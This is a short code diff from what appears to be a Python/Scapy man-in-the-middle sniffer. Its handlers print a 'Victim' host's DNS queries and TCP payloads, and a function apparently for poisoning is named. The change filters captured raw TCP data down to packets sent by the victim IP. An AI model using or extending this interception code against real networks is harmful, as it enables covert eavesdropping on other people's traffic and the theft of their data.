@@ -21,7 +21,7 @@ def dnshandle(pkt):
 		print 'Victim ' + VIP + ' has searched for: ' + pkt.getlayer(DNS).qd.qname
 
 def tcphandle(pkt):
-	if pkt.haslayer(TCP):
+	if pkt.haslayer(TCP) and pkt.getlayer(TCP).haslayer(Raw) == 1 and pkt.getlayer(IP).src == VIP:
 		print 'Victim ' + VIP + ' : ', pkt.getlayer(TCP).load[:25]
 
 def v_poison():
